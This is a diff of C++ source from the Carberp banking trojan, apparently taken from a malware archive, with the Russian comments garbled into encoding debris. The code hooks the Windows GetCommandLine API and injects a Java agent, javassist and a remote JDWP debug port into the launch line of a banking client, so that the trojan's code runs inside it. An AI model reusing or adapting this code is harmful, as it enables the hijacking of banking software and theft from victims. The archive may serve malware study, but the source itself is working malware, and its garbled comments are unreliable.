@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "CmdLine.h"
 #include "GetApi.h"
 #include "Utils.h"
@@ -12,7 +23,7 @@ namespace CMDLINEDEBUGSTRINGS
 	#include "DbgTemplates.h"
 }
 
-// Объявляем шаблон вывода отладочных строк
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 #define DBG CMDLINEDEBUGSTRINGS::DBGOutMessage<>
 
 typedef PCHAR  (WINAPI *PGetCommandLineA)(VOID);
@@ -27,7 +38,7 @@ PGetCommandLineW Real_GetCommandLineW;
 char* InsertString( char* s, int c_s, const char* ins, int c_ins, char* to )
 {
 	char* end1 = s + c_s;
-	char* end2 = end1 + c_ins; //новый конец строки
+	char* end2 = end1 + c_ins; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	while( end1 >= to )
 		*end2-- = *end1--;
 	while( c_ins-- ) 
@@ -52,17 +63,17 @@ PCHAR WINAPI Hook_GetCommandLineA()
 	const char* forIns1 = " -Xdebug -Xrunjdwp:transport=dt_socket,server=y,address=9999 -javaagent:\"%s\\%s\""; 
 	const char* forIns2 = ";\"%s\\Agent.jar\";\"%s\\lib\\javassist.jar\"";//;\"%s\\lib\\client2015.jar\"";
 	DBG("CmdLineA", "----: %s", CommandLineA);
-	if( m_strstr( CommandLineA, "javassist.jar" ) != 0 ) //если уже добавляли, то 2-й раз не нужно
+	if( m_strstr( CommandLineA, "javassist.jar" ) != 0 ) //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ 2-пїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		return CommandLineA;
 
 	char* p1 = m_strstr( CommandLineA, find1 );
-	if( p1 == 0 ) return CommandLineA; //ненаша строка
+	if( p1 == 0 ) return CommandLineA; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	MemPtr<MAX_PATH> allUsers;
 	GetAllUsersProfile( allUsers.str(), allUsers.size() );
 	MemPtr<MAX_PATH> uidTxt;
 	m_lstrcpy( uidTxt, allUsers );
 	m_lstrcat( uidTxt, "\\uid.txt" );
-	if( (DWORD)pGetFileAttributesA(uidTxt.str()) == INVALID_FILE_ATTRIBUTES ) //если файла нет, то ничего не делаем
+	if( (DWORD)pGetFileAttributesA(uidTxt.str()) == INVALID_FILE_ATTRIBUTES ) //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		return CommandLineA;
 
 	int lenCmd = m_lstrlen(CommandLineA);
@@ -70,7 +81,7 @@ PCHAR WINAPI Hook_GetCommandLineA()
 	MemPtr<MAX_PATH + MAX_PATH> ins2;
 	fwsprintfA pwsprintfA = Get_wsprintfA();
 	char* p2 = m_strstr( CommandLineA, find3 );
-	if( p2 ) //онлайн версия
+	if( p2 ) //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	{
 /*
 "C:\Program Files\Java\jre6\bin\java.exe" -D__jvm_launched=3425703260 
@@ -106,9 +117,9 @@ PCHAR WINAPI Hook_GetCommandLineA()
 			else
 				if( File::IsExists(passiveDat) )
 					agent = agentPassive;
-			//вставка "-javaagent:C:\ProgramData\Agent.jar "
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ "-javaagent:C:\ProgramData\Agent.jar "
 			int sz1 = a ? pwsprintfA( ins1, forIns1, allUsers.str(), a ) : 0;
-			//вставка ";C:\ProgramData\Agent.jar;C:\ProgramData\lib\javassist.jar"
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ ";C:\ProgramData\Agent.jar;C:\ProgramData\lib\javassist.jar"
 			int sz2 = pwsprintfA( ins2, forIns2, allUsers.str(), allUsers.str() );//, allUsers.str() );
 			InsertString( CommandLineA, lenCmd, ins2, sz2, p1 - 1 );
 			lenCmd += sz2; p2 += sz2;
@@ -125,13 +136,13 @@ PCHAR WINAPI Hook_GetCommandLineA()
 //       -cp launcher.jar;C:\ProgramData\Agent.jar;C:\ProgramData\lib\javassist.jar com.bifit.launcher.Launcher
 
 		p2 = m_strstr( CommandLineA, find2 );
-		if( p2 ) //оффлайн версия
+		if( p2 ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		{		
-			if( m_strstr( CommandLineA, "javassist.jar" ) == 0 ) //если уже добавляли, то 2-й раз не нужно
+			if( m_strstr( CommandLineA, "javassist.jar" ) == 0 ) //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ 2-пїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 			{
-				//вставка "-javaagent:C:\ProgramData\Agent.jar "
+				//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ "-javaagent:C:\ProgramData\Agent.jar "
 				int sz1 = pwsprintfA( ins1, forIns1, allUsers.str(), agentPassive );
-				//вставка ";C:\ProgramData\Agent.jar;C:\ProgramData\lib\javassist.jar"
+				//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ ";C:\ProgramData\Agent.jar;C:\ProgramData\lib\javassist.jar"
 				int sz2 = pwsprintfA( ins2, forIns2, allUsers.str(), allUsers.str() );//, allUsers.str() );
 				int lenCmd = m_lstrlen(CommandLineA);
 				p1 += sizeof(find1) - 1;
@@ -163,7 +174,7 @@ PWCHAR WINAPI Hook_GetCommandLineW()
 
 bool HookCmdLine() 
 {
-	DBG("CmdLine", "Перехват функций API");
+	DBG("CmdLine", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ API");
 	if ( HookApi( DLL_KERNEL32, Hash_GetCommandLineA, &Hook_GetCommandLineA ) )
 	{  
 		__asm mov [Real_GetCommandLineA], eax			
@@ -174,7 +185,7 @@ bool HookCmdLine()
 		__asm mov [Real_GetCommandLineW], eax			
 	}
 
-	DBG("CmdLine", "Хуки стоят");
+	DBG("CmdLine", "пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ");
 	return true;
 }
 
